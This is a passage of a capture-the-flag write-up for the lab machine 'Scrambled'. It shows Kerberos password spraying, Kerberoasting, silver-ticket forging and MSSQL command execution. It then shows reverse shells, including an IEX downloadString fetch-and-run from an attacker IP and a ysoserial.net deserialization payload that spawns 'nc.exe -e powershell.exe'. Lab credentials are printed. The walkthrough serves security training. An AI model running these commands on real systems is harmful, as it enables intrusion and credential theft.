</pre></table></code></div></div><div file="credentials/access/spray.txt" class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="credentials/access/spray.txt"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
</pre><td class="rouge-code"><pre>
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 09/22/22 - Ronnie Flathers @ropnop

2022/09/22 17:16:15 &gt;  Using KDC(s): [0m
2022/09/22 17:16:15 &gt;  	scrambled.htb:88

2022/09/22 17:16:15 &gt;  [+] VALID LOGIN:	 ksimpson@SCRM.LOCAL:ksimpson
2022/09/22 17:16:15 &gt;  Done! Tested 6 logins (1 successes) in 0.370 seconds

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 09/22/22 - Ronnie Flathers @ropnop

2022/09/22 17:16:15 &gt;  Using KDC(s):
2022/09/22 17:16:15 &gt;  	scrambled.htb:88

2022/09/22 17:16:15 &gt;  Done! Tested 6 logins (0 successes) in 0.266 seconds

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 09/22/22 - Ronnie Flathers @ropnop

2022/09/22 17:16:15 &gt;  Using KDC(s):
2022/09/22 17:16:15 &gt;  	scrambled.htb:88

2022/09/22 17:16:15 &gt;  Done! Tested 6 logins (0 successes) in 0.242 seconds

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 09/22/22 - Ronnie Flathers @ropnop

2022/09/22 17:16:15 &gt;  Using KDC(s):
2022/09/22 17:16:15 &gt;  	scrambled.htb:88

2022/09/22 17:16:16 &gt;  Done! Tested 6 logins (0 successes) in 0.266 seconds

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 09/22/22 - Ronnie Flathers @ropnop

2022/09/22 17:16:16 &gt;  Using KDC(s):
2022/09/22 17:16:16 &gt;  	scrambled.htb:88

2022/09/22 17:16:16 &gt;  Done! Tested 6 logins (0 successes) in 0.294 seconds

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 09/22/22 - Ronnie Flathers @ropnop

2022/09/22 17:16:16 &gt;  Using KDC(s):
2022/09/22 17:16:16 &gt;  	scrambled.htb:88

2022/09/22 17:16:16 &gt;  Done! Tested 6 logins (0 successes) in 0.264 seconds
</pre></table></code></div></div><p>We will find the following valid credentials:</p><div file="credentials/access/credentials.txt" class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="credentials/access/credentials.txt"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>AD -&gt; ksimpson -&gt; ksimpson
</pre></table></code></div></div><h3 id="smb"><span class="mr-2">SMB</span><a href="#smb" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>If we enumerate the <code class="language-plaintext highlighter-rouge">SMB</code> service using <code class="language-plaintext highlighter-rouge">impacket-smbclient</code> with the credentials we have just found, we will find the following:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/scrambled/smb.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>SMB Client</em></p><p>We can see a <code class="language-plaintext highlighter-rouge">PDF</code> named <code class="language-plaintext highlighter-rouge">Network Security Changes.pdf</code> in the <code class="language-plaintext highlighter-rouge">Public</code> share. We will download it and proceed to inspect it:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/scrambled/pdf.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>Network Security Changes.pdf</em></p><p>This <code class="language-plaintext highlighter-rouge">PDF</code> reveals some useful information. First, we see the same alert that was present on the web server. This alert basically says that the <code class="language-plaintext highlighter-rouge">NTLM</code> authentication has been disabled on the network of the company. In the second section of the <code class="language-plaintext highlighter-rouge">PDF</code> we can see some very interesting information. This section says that an attacker was able to retrieve credentials from the <code class="language-plaintext highlighter-rouge">HR</code> <code class="language-plaintext highlighter-rouge">SQL</code> database and that access to the <code class="language-plaintext highlighter-rouge">SQL</code> service has been removed for everyone apart from the network administrators. So basically, it is giving us a hint saying that we can find credentials in the <code class="language-plaintext highlighter-rouge">SQL</code> database.</p><h2 id="user-shell"><span class="mr-2">User Shell</span><a href="#user-shell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><hr /><p>With all the information that we have retrieved in the enumeration phase, we will proceed to try to get a shell from the target machine.</p><h3 id="silver-ticket-attack"><span class="mr-2">Silver Ticket Attack</span><a href="#silver-ticket-attack" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>At this point, we can use the <code class="language-plaintext highlighter-rouge">impacket-GetUserSPNs</code> tool to retrieve the <code class="language-plaintext highlighter-rouge">SPNs (Service Principal Names)</code> and their associated user accounts. <code class="language-plaintext highlighter-rouge">SPNs</code> are unique identifiers of a service instance and they are used by <code class="language-plaintext highlighter-rouge">Kerberos</code> to associate a service instance with a service logon account. This tool can also retrieve the <code class="language-plaintext highlighter-rouge">TGS (Ticket Granting Service)</code>, in a hash format, of the user account associated with a service, and that is what we are going to do now. As we have valid credentials for <code class="language-plaintext highlighter-rouge">Kerberos</code>, we can try to retrieve the hash of a user account associated with a <code class="language-plaintext highlighter-rouge">SPN</code>:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/scrambled/getuserspn.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>GetUserSPNs</em></p><p>We can see how we have retrieved the hash associated with the <code class="language-plaintext highlighter-rouge">SqlSvc</code> user that runs the <code class="language-plaintext highlighter-rouge">MSSQLSvc/dc1.scrm.local:1433</code> SPN. We will crack this hash using <a href="https://github.com/openwall/john">John The Ripper</a> and the <code class="language-plaintext highlighter-rouge">rockyou.txt</code> wordlist:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/scrambled/cracking.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>JTR Cracking</em></p><p>We will find the following valid credentials:</p><div file="credentials/access/credentials.txt" class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="credentials/access/credentials.txt"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>AD -&gt; sqlsvc -&gt; Pegasus60
</pre></table></code></div></div><p>It is important to emphasize that these credentials are only going to be useful in their associated service. In this case, the <code class="language-plaintext highlighter-rouge">SqlSvc</code> user credentials and the <code class="language-plaintext highlighter-rouge">MSSQLSvc/dc1.scrm.local:1433</code> <code class="language-plaintext highlighter-rouge">SPN</code>.</p><p>With this said, we can try to forge a <code class="language-plaintext highlighter-rouge">Silver Ticket</code> from the <code class="language-plaintext highlighter-rouge">DC</code> to access the <code class="language-plaintext highlighter-rouge">MSSQL</code> service as the <code class="language-plaintext highlighter-rouge">SqlSvc</code> user. <code class="language-plaintext highlighter-rouge">Silver Tickets</code> are related to <code class="language-plaintext highlighter-rouge">Golden Tickets</code> but are more limited in scope. They give attackers access to a single service in an application, instead of all the services in the entire domain, as is the case with <code class="language-plaintext highlighter-rouge">Golden Tickets</code>. Once we have a ticket, we can use a technique called <code class="language-plaintext highlighter-rouge">PassTheTicket</code> that allows us to login to a service with a ticket instead of using traditional credentials.</p><p>In order to forge a <code class="language-plaintext highlighter-rouge">Silver Ticket</code>, we will first need to retrieve some information from the domain. First, we will use the following command to get the <code class="language-plaintext highlighter-rouge">Domain SID (Security Identifier)</code>:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>impacket-getPac <span class="nt">-targetUser</span> ksimpson scrm.local/ksimpson:ksimpson
</pre></table></code></div></div><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/scrambled/getpac.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>Domain SID</em></p><p>Once we have the <code class="language-plaintext highlighter-rouge">Domain SID</code>, we will convert the password that we have cracked to an <code class="language-plaintext highlighter-rouge">NTLM</code> hash using the following command:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/scrambled/ntlm.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>Password to NTLM</em></p><p>Now we have all the information that we need to forge the <code class="language-plaintext highlighter-rouge">Silver Ticket</code>. We will use <code class="language-plaintext highlighter-rouge">impacket-ticketer</code> in order to do this:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>impacket-ticketer <span class="nt">-domain-sid</span> S-1-5-21-2743207045-1827831105-2542523200 <span class="nt">-spn</span> MSSQLSvc/dc1.scrm.local:1433 <span class="nt">-domain</span> scrm.local <span class="nt">-dc-ip</span> dc1.scrm.local <span class="nt">-nthash</span> b999a16500b87d17ec7f2e2a68778f05 Administrator
</pre></table></code></div></div><p>This command will generate an <code class="language-plaintext highlighter-rouge">Administrator.ccache</code> file that will correspond to our <code class="language-plaintext highlighter-rouge">Silver Ticket</code> for the <code class="language-plaintext highlighter-rouge">MSSQL</code> service as the <code class="language-plaintext highlighter-rouge">SqlSvc</code> user.</p><h3 id="mssql"><span class="mr-2">MSSQL</span><a href="#mssql" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Once we have the <code class="language-plaintext highlighter-rouge">Silver Ticket</code>, we will use the following command to do <code class="language-plaintext highlighter-rouge">PassTheTicket</code> and connect to the <code class="language-plaintext highlighter-rouge">SQL</code> database of the machine in an interactive session:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">export </span><span class="nv">KRB5CCACHE</span><span class="o">=</span>Administrator.ccache<span class="p">;</span> impacket-mssqlclient <span class="nt">-k</span> dc1.scrm.local
</pre></table></code></div></div><p>Once we are connected, we will list the available databases and tables:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/scrambled/db1.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>ScrambleHR Database Tables</em></p><p>We will find an interesting table named <code class="language-plaintext highlighter-rouge">UserImport</code> in the <code class="language-plaintext highlighter-rouge">ScrambleHR</code> database. If we recall, it is the database where the <code class="language-plaintext highlighter-rouge">PDF</code> document stated that the credentials were in. We will enumerate all the columns in this table:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/scrambled/db2.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>Password in Table</em></p><p>We can see how we can find some credentials as stated in the <code class="language-plaintext highlighter-rouge">PDF</code> document.</p><div file="credentials/access/credentials.txt" class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="credentials/access/credentials.txt"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>AD -&gt; MiscSvc -&gt; ScrambledEggs9900
</pre></table></code></div></div><p>In addition, if we visualize the help panel, we can see that we can activate the <code class="language-plaintext highlighter-rouge">xp_cmdshell</code> function. This function allows us to execute <code class="language-plaintext highlighter-rouge">cmd</code> commands in the machine hosting the <code class="language-plaintext highlighter-rouge">SQL</code> database. We will first activate it and then try the execution of commands:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/scrambled/db3.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>xp_cmdshell</em></p><h3 id="reverse-shells"><span class="mr-2">Reverse Shells</span><a href="#reverse-shells" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="sqlsvc"><span class="mr-2">SQLSvc</span><a href="#sqlsvc" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Having command execution as the <code class="language-plaintext highlighter-rouge">sqlsvc</code> user, we will try to send a reverse shell to our machine in order to have a proper shell to operate from.</p><p>First, we will host the <code class="language-plaintext highlighter-rouge">nc64.exe</code> binary with <code class="language-plaintext highlighter-rouge">python3 -m http.server</code> and then we will download it to the target machine. Additionally, we will listen on port 443 with <code class="language-plaintext highlighter-rouge">rlwrap nc -nlvp 443</code>. Finally, we will send a reverse shell from the target machine to our machine on port 443 with the <code class="language-plaintext highlighter-rouge">nc64.exe</code> binary:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/scrambled/rev1.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>SQLSvc Reverse Shell</em></p><p>We can see that we have a shell as the <code class="language-plaintext highlighter-rouge">sqlsvc</code> user.</p><h4 id="miscsvc"><span class="mr-2">MiscSvc</span><a href="#miscsvc" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Having a shell as the <code class="language-plaintext highlighter-rouge">sqlsvc</code> user to operate as well as the credentials for the <code class="language-plaintext highlighter-rouge">miscsvc</code> user, we will try to send a reverse shell as the <code class="language-plaintext highlighter-rouge">miscsvc</code> user to our machine using the <code class="language-plaintext highlighter-rouge">Invoke-PowerShellTcp.ps1</code> <code class="language-plaintext highlighter-rouge">Powershell</code> script from <a href="https://github.com/samratashok/nishang">Nishang</a>.</p><p>First, we will edit the <code class="language-plaintext highlighter-rouge">Invoke-PowerShellTcp.ps1</code> script, and we will add the following command at the end of the script. This will have an advantage as we can run the script directly when it is downloaded without having to download it first and then run it. We will indicate that we want a reverse shell, the IP address of our machine, and the port that we want to use (9000):</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Invoke-PowerShellTcp</span><span class="w"> </span><span class="nt">-Reverse</span><span class="w"> </span><span class="nt">-IPAddress</span><span class="w"> </span><span class="nx">10.10.14.11</span><span class="w"> </span><span class="nt">-Port</span><span class="w"> </span><span class="nx">9000</span><span class="w">
</span></pre></table></code></div></div><p>We will host this file with <code class="language-plaintext highlighter-rouge">python3 -m http.server</code>.</p><p>Then, on the target machine, we will execute the following commands in order to create secure <code class="language-plaintext highlighter-rouge">PSCredentials</code> with the password that we have retrieved from the database for the <code class="language-plaintext highlighter-rouge">miscsvc</code> user:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$SecPassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s1">'ScrambledEggs9900'</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
</span><span class="nv">$Cred</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Management.Automation.PSCredential</span><span class="p">(</span><span class="s1">'Scrm\MiscSvc'</span><span class="p">,</span><span class="w"> </span><span class="nv">$SecPassword</span><span class="p">)</span><span class="w">
</span></pre></table></code></div></div><p>Last, we will execute the following command in order to download and execute the <code class="language-plaintext highlighter-rouge">Invoke-PowerShellTcp.ps1</code> script as the <code class="language-plaintext highlighter-rouge">miscsvc</code> user with the <code class="language-plaintext highlighter-rouge">PSCredentials</code> that we have just created. We will be listening in the 9000 port in our machine with <code class="language-plaintext highlighter-rouge">rlwrap nc -nlvp 9000</code> too:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Invoke-Command</span><span class="w"> </span><span class="nt">-Computer</span><span class="w"> </span><span class="nx">dc1</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$Cred</span><span class="w"> </span><span class="nt">-ScriptBlock</span><span class="w"> </span><span class="p">{</span><span class="n">IEX</span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">downloadString</span><span class="p">(</span><span class="s2">"http://10.10.14.11:8000/Invoke-PowerShellTcp.ps1"</span><span class="p">)}</span><span class="w">
</span></pre></table></code></div></div><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/scrambled/rev2.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>MiscSvc Reverse Shell</em></p><p>We can see that we have a shell as the <code class="language-plaintext highlighter-rouge">miscsvc</code> user. Now we can proceed to visualize the <code class="language-plaintext highlighter-rouge">user.txt</code> flag in the <code class="language-plaintext filepath highlighter-rouge">C:\Windows\Users\miscsvc\Desktop\</code> directory.</p><h2 id="administrator-shell"><span class="mr-2">Administrator Shell</span><a href="#administrator-shell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><hr /><p>Now that we have a shell as the <code class="language-plaintext highlighter-rouge">miscsvc</code> user, we will proceed to enumerate the target machine in order to gain <code class="language-plaintext highlighter-rouge">Administrator</code> access.</p><h3 id="enumeration-1"><span class="mr-2">Enumeration</span><a href="#enumeration-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>It is always important to check the processes that are running on the target machine as they are a very common attack vector in order to gain privileged access. To do this, we will use the following command:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-Process</span><span class="w">
</span></pre></table></code></div></div><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/scrambled/privesc1.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>Get-Process</em></p><p>We can see a process named <code class="language-plaintext highlighter-rouge">ScrambleServer</code> that will attract our attention. If we remember the enumeration phase, there was a client program that was connecting to the <code class="language-plaintext highlighter-rouge">DC</code> on port 4411. We can guess that the server behind that client program is this process.</p><h3 id="net-reverse-engineering"><span class="mr-2">.Net Reverse Engineering</span><a href="#net-reverse-engineering" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We know that there is a process called <code class="language-plaintext highlighter-rouge">ScrambleServer</code>, but where is the client for this server that we have seen on the web server? We will enumerate the machine further and we will find the following files:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/scrambled/apps.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>EXE and DLL</em></p><p>If we download the files to our machine and inspect them:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/scrambled/apps2.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>File type</em></p><p>We can see that we have a <code class="language-plaintext highlighter-rouge">DLL</code> file and a <code class="language-plaintext highlighter-rouge">EXE</code> file, both of them being <code class="language-plaintext highlighter-rouge">PE32</code> executables.</p><p>We will use <a href="https://github.com/icsharpcode/ILSpy">ILSpy</a> in order to decompile both files and see how they are built and how they run.</p><p>If we analyze the code of the binaries, we will find some interesting things in the <code class="language-plaintext highlighter-rouge">ScrambleLib.dll</code> binary.</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 300 100'%3E%3C/svg%3E" data-src="/assets/img/posts/scrambled/declaration1.png" alt="Desktop View" width="300" height="100" data-proofer-ignore> <em>Request Type Declaration</em></p><p>We can see that we have a declaration of an enum object populated with functions, named <code class="language-plaintext highlighter-rouge">RequestType</code>.</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/scrambled/declaration2.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>Message Code Declaration</em></p><p>This object is used when <code class="language-plaintext highlighter-rouge">UPLOAD_ORDER</code> is typed in the client application.</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/scrambled/uploadOrder.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>Insecure Deserialization Vulnerability in the Code</em></p><p>If we analyze the <code class="language-plaintext highlighter-rouge">UploadOrder</code> function, we can see how it calls a function named <code class="language-plaintext highlighter-rouge">SerializeToBase64</code>.</p><p>We will find the following two functions in the <code class="language-plaintext highlighter-rouge">SalesOrder</code> class:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/scrambled/salesorder.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>Insecure Deserialization Vulnerability in the Code</em></p><p>We can see that these two functions are used to serialize and deserialize data. This type of function should always be reviewed before production because it may pose a security risk. If user data is passed to these functions without being sanitized, it can lead to <code class="language-plaintext highlighter-rouge">RCE (Remote Command Execution)</code>.</p><p>In the <code class="language-plaintext highlighter-rouge">DeserializeFromBase64</code> function, the user data is passed to the <code class="language-plaintext highlighter-rouge">binaryFormatter.Deserialize</code> function without being sanitized, and this function is called when the user types <code class="language-plaintext highlighter-rouge">UPLOAD_ORDER + {PAYLOAD}</code> in the client application. This leads to an <code class="language-plaintext highlighter-rouge">Insecure Deserialization</code> vulnerability.</p><h3 id="insecure-deserialization"><span class="mr-2">Insecure Deserialization</span><a href="#insecure-deserialization" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>In order to abuse this <code class="language-plaintext highlighter-rouge">Insecure Deserialization</code> vulnerability, we can use the <a href="https://github.com/pwntester/ysoserial.net">ysoserial.net</a> tool. This tool generates a serialized payload that allows you to execute commands when it is deserialized. This tool, in particular, is for <code class="language-plaintext highlighter-rouge">.Net</code> applications, but there are similar tools for other programming languages too.</p><p>We will download the <code class="language-plaintext highlighter-rouge">ysoserial.zip</code> and transfer it to the target machine:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/scrambled/ysoserial1.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>ysoserial Transfer</em></p><p>Now we will extract the <code class="language-plaintext highlighter-rouge">.zip</code> file with the following command:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Expand-Archive</span><span class="w"> </span><span class="nx">ysoserial.zip</span><span class="w">
</span></pre></table></code></div></div><p>Once we have the executable file on the target machine. We can execute it setting the formatter to <code class="language-plaintext highlighter-rouge">BinaryFormatter</code> (remember it was the function being used to deserialize), the <code class="language-plaintext highlighter-rouge">WindowsIdentity</code> gadget, that we want the payload in <code class="language-plaintext highlighter-rouge">Base64</code> format (remember the deserialize function received a <code class="language-plaintext highlighter-rouge">Base64</code> string) and the command that we want to execute (simple <code class="language-plaintext highlighter-rouge">powershell</code> reverse shell with the <code class="language-plaintext highlighter-rouge">nc.exe</code> binary we have uploaded previously) :</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">.</span><span class="n">\ysoserial.exe</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="nx">BinaryFormatter</span><span class="w"> </span><span class="nt">-g</span><span class="w"> </span><span class="nx">WindowsIdentity</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="nx">base64</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s2">"C:\Temp\nc.exe -e powershell.exe 10.10.14.11 443"</span><span class="w">
</span></pre></table></code></div></div><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/scrambled/ysoserial2.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>ysoserial Payload</em></p><p>Once we have the payload generated, we will copy it. Now we will connect via <code class="language-plaintext highlighter-rouge">nc</code> to port 4411 on the target machine. Then, we will listen on a port for the reverse shell with <code class="language-plaintext highlighter-rouge">rlwrap nc -nlvp 443</code>. Last, we will type the following into the <code class="language-plaintext highlighter-rouge">nc</code> connection:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>UPLOAD_ORDER<span class="p">;</span><span class="o">{</span>PAYLOAD<span class="o">}</span>
